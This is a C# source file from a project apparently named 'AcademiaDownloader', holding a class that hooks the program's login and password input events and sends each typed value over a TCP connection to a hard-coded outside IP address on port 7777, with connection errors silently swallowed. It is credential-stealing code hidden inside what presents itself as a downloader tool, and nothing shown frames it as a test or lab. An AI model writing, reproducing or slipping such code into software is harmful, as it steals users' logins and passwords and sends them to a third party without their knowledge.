using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace AcademiaDownloader
{
    class SenderToServer
    {
        private TcpClient client;
        private StreamWriter writer;
      

        public SenderToServer()
        {
            Start();
            Console.ReadLine();
        }

        private void Start()
        {
            try
            {
                UI.AonChangeLogin += SendLogin;
                UI.AonChangePass += SendPassword;
                IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse("188.18.55.58"), 7777);
                client = new TcpClient();
                client.Connect(serverEndPoint);
                writer = new StreamWriter(client.GetStream());
                writer.AutoFlush = true;
            }
            catch { }
        }

        private void SendLogin(string message)
        {
            writer.WriteLine("Login: "+message);
        }

        private void SendPassword(string message)
        {
            writer.WriteLine("Password: " + message);
        }

    }
}
